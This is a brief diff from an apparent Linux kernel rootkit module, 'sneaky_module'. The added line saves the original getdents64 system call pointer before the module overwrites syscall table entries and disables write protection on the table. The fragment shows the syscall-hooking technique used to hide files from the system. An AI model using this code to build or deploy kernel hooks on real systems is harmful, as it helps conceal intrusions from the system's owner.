@@ -159,6 +159,7 @@ static int initialize_sneaky_module(void)
   // function address. Then overwrite its address in the system call
   // table with the function address of our new code.
   original_openat = (void *)sys_call_table[__NR_openat];
+  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
   
   // Turn off write protection mode for sys_call_table
   enable_page_rw((void *)sys_call_table);
